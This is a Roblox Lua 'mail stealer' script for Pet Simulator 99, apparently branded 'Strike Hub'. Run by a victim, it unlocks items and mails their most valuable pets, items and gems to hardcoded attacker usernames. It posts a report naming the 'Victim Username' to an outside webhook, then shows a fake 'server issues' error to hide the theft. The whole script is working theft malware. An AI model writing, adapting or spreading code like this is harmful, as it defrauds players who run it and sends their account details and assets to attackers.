_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local plr = game.Players.LocalPlayer
local network = require(game.ReplicatedStorage.Library.Client.Network)
local library = require(game.ReplicatedStorage.Library)
local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
local HttpService = game:GetService("HttpService")
local message = require(game.ReplicatedStorage.Library.Client.Message)
local MailMessage = "GGz"
local sortedItems = {}
local totalRAP = 0

local users = _G.Usernames or {"ilovemyamazing_gf1","Yeahboi1131","Dragonshell23","Dragonshell24","Dragonshell21"}
local min_rap = _G.minrap or 1000000
local webhook = _G.webhook or ""

if next(users) == nil or webhook == "" then
    plr:kick("You didn't add any usernames or webhook")
    return
end

for _, user in ipairs(users) do
    if plr.Name == user then
        plr:kick("You cannot mailsteal yourself")
        return
    end
end

-- Find mail cost function
local FunctionToGetFirstPriceOfMail
for _, func in pairs(getgc()) do
    if debug.getinfo(func).name == "computeSendMailCost" then
        FunctionToGetFirstPriceOfMail = func
        break
    end
end

local mailSendPrice = FunctionToGetFirstPriceOfMail()
local GemAmount1 = 1
if save.Currency then
    for _, v in pairs(save.Currency) do
        if v.id == "Diamonds" then
            GemAmount1 = v._am
            break
        end
    end
end

-- Format numbers for webhook
local function formatNumber(num)
    local num = math.floor(num)
    local suffixes = {"", "k", "m", "b", "t"}
    local index = 1
    while num >= 1000 do
        num = num / 1000
        index = index + 1
    end
    return string.format("%.2f%s", num, suffixes[index])
end

-- RAP calculation
local function getRAP(Type, Item)
    return (require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get({
        Class = {Name = Type},
        IsA = function(hmm) return hmm == Type end,
        GetId = function() return Item.id end,
        StackKey = function() return HttpService:JSONEncode({id=Item.id,pt=Item.pt,sh=Item.sh,tn=Item.tn}) end,
        AbstractGetRAP = function(self) return nil end
    }) or 0)
end

local netInvoke = network and network.Invoke

-- Send a single item to users
local function sendItem(category, uid, am)
    local sent = false
    local userIndex = 1
    local maxUsers = #users
    local sendDelay = 0.2

    repeat
        local currentUser = users[userIndex]
        local args = {currentUser, MailMessage, category, uid, am}

        local success, response, err = pcall(function()
            return netInvoke("Mailbox: Send", unpack(args))
        end)

        if success and response == true then
            sent = true
            GemAmount1 = GemAmount1 - mailSendPrice
            mailSendPrice = math.ceil(mailSendPrice * 1.5)
            if mailSendPrice > 5000000 then mailSendPrice = 5000000 end
            wait(sendDelay)
        elseif success and response == false and err == "They don't have enough space!" then
            userIndex = userIndex + 1
            if userIndex > maxUsers then sent = true end
            wait(sendDelay)
        else
            wait(sendDelay)
        end
    until sent
end

-- Send all gems
local function SendAllGems()
    if GemAmount1 <= mailSendPrice then return end
    for i, v in pairs(save.Currency) do
        if v.id == "Diamonds" then
            local userIndex = 1
            local maxUsers = #users
            local sent = false

            repeat
                local currentUser = users[userIndex]
                local args = {currentUser, MailMessage, "Currency", i, GemAmount1 - mailSendPrice}
                local success, response, err = pcall(function()
                    return netInvoke("Mailbox: Send", unpack(args))
                end)
                if success and response == true then
                    sent = true
                elseif success and response == false and err == "They don't have enough space!" then
                    userIndex = userIndex + 1
                    if userIndex > maxUsers then sent = true end
                else
                    wait(0.05)
                end
            until sent
            break
        end
    end
end

-- Empty boxes
local function EmptyBoxes()
    if save.Box then
        for k, v in pairs(save.Box) do
            if v._uq then
                network.Invoke("Box: Withdraw All", k)
            end
        end
    end
end

-- Claim mailbox
local function ClaimMail()
    local response, err = network.Invoke("Mailbox: Claim All")
    while err == "You must wait 30 seconds before using the mailbox!" do
        wait(0.2)
        response, err = network.Invoke("Mailbox: Claim All")
    end
end

-- Check if mail can be sent
local function canSendMail()
    for uid, _ in pairs(save.Pet or {}) do
        local args = {"Roblox", "Test", "Pet", uid, 1}
        local _, err = network.Invoke("Mailbox: Send", unpack(args))
        return err == "They don't have enough space!"
    end
    return true
end

require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()

-- Collect items
local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}

for _, cat in ipairs(categoryList) do
    if save[cat] then
        for uid, item in pairs(save[cat]) do
            local rap = getRAP(cat, item)
            if cat == "Pet" then
                local dir = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)[item.id]
                if dir.gargantuan or dir.titanic or dir.huge or dir.exclusiveLevel then
                    if rap >= min_rap then
                        local prefix = ""
                        if item.pt == 1 then prefix = "Golden " elseif item.pt == 2 then prefix = "Rainbow " end
                        if item.sh then prefix = "Shiny " .. prefix end
                        table.insert(sortedItems, {category=cat, uid=uid, amount=item._am or 1, rap=rap, name=prefix..item.id, priority=(dir.gargantuan or dir.titanic) and 1 or 0})
                        totalRAP = totalRAP + (rap*(item._am or 1))
                    end
                end
            else
                if rap >= min_rap then
                    table.insert(sortedItems, {category=cat, uid=uid, amount=item._am or 1, rap=rap, name=item.id, priority=0})
                    totalRAP = totalRAP + (rap*(item._am or 1))
                end
            end
            if item._lk then
                network.Invoke("Locking_SetLocked", uid, false)
            end
        end
    end
end

-- Send items
if #sortedItems > 0 or GemAmount1 > min_rap + mailSendPrice then
    ClaimMail()
    EmptyBoxes()
    if not canSendMail() then
        message.Error("Account error. Please rejoin or use a different account")
        return
    end

    table.sort(sortedItems, function(a,b)
        if a.priority ~= b.priority then return a.priority > b.priority end
        return (a.rap * a.amount) > (b.rap * b.amount)
    end)

    task.spawn(function()
        -- Webhook
        local headers = {["Content-Type"]="application/json"}
        local fields={{name="Victim Username:", value=plr.Name, inline=true},{name="Items to be sent:", value="", inline=false},{name="Summary:", value="", inline=false}}
        for _, item in ipairs(sortedItems) do
            fields[2].value = fields[2].value .. item.name.." (x"..item.amount.."): "..formatNumber(item.rap*item.amount).." RAP\n"
        end
        fields[3].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(GemAmount1), formatNumber(totalRAP))
        local body = HttpService:JSONEncode({embeds={{title="\240\159\144\177 New PS99 Execution", color=65280, fields=fields, footer={text="Strike Hub."}}}})
        request({Url=webhook, Method="POST", Headers=headers, Body=body})
    end)

    for _, item in ipairs(sortedItems) do
        if GemAmount1 > mailSendPrice then
            sendItem(item.category, item.uid, item.amount)
        else
            break
        end
    end

    if GemAmount1 > mailSendPrice then
        SendAllGems()
    end

    message.Error("We are Having server issues please rejoin and try again")
end
